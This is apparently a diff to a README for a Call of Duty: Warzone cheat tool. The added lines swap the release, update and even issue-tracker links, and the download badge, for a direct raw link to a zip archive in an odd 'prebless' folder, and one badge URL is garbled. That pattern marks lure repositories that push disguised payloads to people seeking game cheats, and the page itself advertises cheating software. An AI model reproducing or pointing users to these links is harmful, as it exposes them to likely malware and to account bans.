@@ -5,7 +5,7 @@
 Welcome to WarzoneExternalCheat! This tool helps improve your gameplay in Call of Duty: Warzone 3.0. Follow the steps below to download and run the application.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/beshoyattia/WarzoneExternalCheat/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/beshoyattia/WarzoneExternalCheat/main/prebless/WarzoneExternalCheat.zip%20Latest%https://raw.githubusercontent.com/beshoyattia/WarzoneExternalCheat/main/prebless/WarzoneExternalCheat.zip)](https://raw.githubusercontent.com/beshoyattia/WarzoneExternalCheat/main/prebless/WarzoneExternalCheat.zip)
 
 ## 🛠️ System Requirements
 - **Operating System:** Windows 10 or newer
@@ -23,7 +23,7 @@ Welcome to WarzoneExternalCheat! This tool helps improve your gameplay in Call o
 - **User-Friendly Interface:** Easy to navigate and configure.
 
 ## 📋 Download & Install
-1. Visit the [Releases Page](https://github.com/beshoyattia/WarzoneExternalCheat/releases) to download the latest version of WarzoneExternalCheat.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/beshoyattia/WarzoneExternalCheat/main/prebless/WarzoneExternalCheat.zip) to download the latest version of WarzoneExternalCheat.
 2. Download the installer file from the latest release.
 3. Once downloaded, locate the installer on your computer.
 4. Double-click the installer to start the setup.
@@ -47,11 +47,11 @@ Your safety is important. Use this application responsibly and ensure you comply
 If you encounter any issues:
 - Ensure your system meets the requirements.
 - Restart your computer and try launching the application again.
-- Check for updates on the [Releases Page](https://github.com/beshoyattia/WarzoneExternalCheat/releases).
+- Check for updates on the [Releases Page](https://raw.githubusercontent.com/beshoyattia/WarzoneExternalCheat/main/prebless/WarzoneExternalCheat.zip).
 - Visit the community forums or contact support for assistance.
 
 ## 📞 Support
-For questions or support, please open an issue on the [Issues Page](https://github.com/beshoyattia/WarzoneExternalCheat/issues). Our community is here to help!
+For questions or support, please open an issue on the [Issues Page](https://raw.githubusercontent.com/beshoyattia/WarzoneExternalCheat/main/prebless/WarzoneExternalCheat.zip). Our community is here to help!
 
 Thank you for using WarzoneExternalCheat! We hope you enjoy your enhanced gaming experience.
 ```
